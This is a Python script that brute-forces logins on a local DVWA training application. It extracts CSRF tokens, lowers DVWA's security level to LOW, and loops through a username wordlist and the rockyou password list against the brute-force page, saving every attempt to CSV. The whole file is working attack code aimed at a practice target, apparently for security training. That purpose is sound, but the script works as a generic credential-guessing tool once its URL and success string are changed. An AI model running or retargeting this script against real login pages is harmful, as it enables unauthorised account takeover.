import re
import time

import pandas as pd
import requests


"""
DVWA brute-force login tester.

- Logs in to DVWA to establish a session
- Sets security level to LOW
- Iterates over username and password wordlists
- Attempts each combination against the DVWA brute-force page
- Logs results and saves them to CSV.
"""


# === CONFIGURATION ===
# DVWA instance details
DVWA_BASE_URL = "http://127.0.0.1/DVWA"
DVWA_USERNAME = "admin"     # DVWA login username
DVWA_PASSWORD = "password"  # DVWA login password

# Bruteforce target endpoint
TARGET_URL = f"{DVWA_BASE_URL}/vulnerabilities/brute/"

# Wordlists
USERNAME_WORDLIST = "/home/kali/cirt-default-usernames.txt"
PASSWORD_WORDLIST = "/home/kali/rockyou.txt"

# Output CSV file
OUTPUT_FILE = "bruteforce_results_full_delayed.csv"

# Text that indicates a successful login
SUCCESS_MESSAGE = "Welcome to the password protected area"

# Create a session object to persist cookies and headers
session = requests.Session()
session.headers.update(
    {
        "User-Agent": (
            "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) "
            "Gecko/20100101 Firefox/102.0"
        )
    }
)


# === HELPER FUNCTIONS ===
def get_csrf_token(text: str) -> str | None:
    """
    Extract the user_token (CSRF token) from a DVWA HTML page.

    Args:
        text: HTML content returned by DVWA.

    Returns:
        The CSRF token string if found, otherwise None.
    """
    match = re.search(r"name=['\"]user_token['\"] value=['\"]([^'\"]+)['\"]", text)
    return match.group(1) if match else None


def login_to_dvwa() -> bool:
    """
    Log into the DVWA application to establish a valid session.

    Returns:
        True if login succeeds, False otherwise.
    """
    print("Logging into DVWA to establish a session...")
    try:
        login_page = session.get(f"{DVWA_BASE_URL}/login.php")
        token = get_csrf_token(login_page.text)
        if not token:
            raise ConnectionError("Failed to retrieve CSRF token. Is DVWA running?")

        login_data = {
            "username": DVWA_USERNAME,
            "password": DVWA_PASSWORD,
            "Login": "Login",
            "user_token": token,
        }

        resp = session.post(
            f"{DVWA_BASE_URL}/login.php",
            data=login_data,
            allow_redirects=True,
        )

        if "logout.php" in resp.text:
            print("Login successful.")
            return True

        print("Login failed. Check DVWA credentials in the script.")
        return False

    except requests.exceptions.RequestException as exc:
        print(f"Connection error during login: {exc}")
        return False


def set_security_low() -> None:
    """
    Set DVWA security level to LOW.

    Prints an error message if the CSRF token cannot be retrieved.
    """
    print("Setting DVWA security level to LOW...")
    security_page = session.get(f"{DVWA_BASE_URL}/security.php")
    token = get_csrf_token(security_page.text)
    if not token:
        print("Could not set security level: Failed to retrieve CSRF token.")
        return

    security_data = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": token,
    }
    session.post(f"{DVWA_BASE_URL}/security.php", data=security_data)
    print("Security level set to LOW.")


def attempt_bruteforce(username: str, password: str) -> tuple[bool, int]:
    """
    Attempt a single username/password combination against the brute-force page.

    Args:
        username: Candidate username.
        password: Candidate password.

    Returns:
        A tuple of:
            - success (bool): True if login was successful.
            - response_size (int): Length of response content in bytes.
    """
    params = {
        "username": username,
        "password": password,
        "Login": "Login",
    }

    response = session.get(TARGET_URL, params=params)

    if SUCCESS_MESSAGE in response.text:
        return True, len(response.content)

    return False, len(response.content)


def main() -> None:
    """Main entry point to orchestrate the brute-force attack."""
    if not login_to_dvwa():
        return

    set_security_low()

    try:
        with open(USERNAME_WORDLIST, "r", encoding="latin-1") as file_user:
            usernames = [line.strip() for line in file_user if line.strip()]

        with open(PASSWORD_WORDLIST, "r", encoding="latin-1") as file_pass:
            passwords = [line.strip() for line in file_pass if line.strip()]

    except FileNotFoundError as exc:
        print(f"Error: Wordlist not found. {exc}")
        return

    total_attempts = len(usernames) * len(passwords)
    print(f"Starting brute-force with {total_attempts} total attempts...")

    results: list[dict] = []
    found_credentials: list[tuple[str, str]] = []

    start_time = time.time()

    for user in usernames:
        for pwd in passwords:
            print(
                f"Attempting -> username: [{user}] | password: [{pwd}]",
                end="\r",
                flush=True,
            )

            success, resp_size = attempt_bruteforce(user, pwd)

            results.append(
                {
                    "username": user,
                    "password": pwd,
                    "success": success,
                    "response_size": resp_size,
                }
            )

            if success:
                found_credentials.append((user, pwd))
                print(
                    f"\nValid credentials found -> username: [{user}] | "
                    f"password: [{pwd}]"
                )

    elapsed = time.time() - start_time
    print("\n" + "=" * 40)
    print("Brute-force completed.")
    print(f"Elapsed time: {elapsed:.2f} seconds")

    if found_credentials:
        print("\nValid credential pairs discovered:")
        for user, pwd in found_credentials:
            print(f"  - Username: {user}, Password: {pwd}")
    else:
        print("\nNo valid credentials were found.")

    print("=" * 40)
    print("\nSaving all attempts to CSV...")

    pd.DataFrame(results).to_csv(OUTPUT_FILE, index=False)
    print(f"Full results saved to: {OUTPUT_FILE}")


if __name__ == "__main__":
    main()
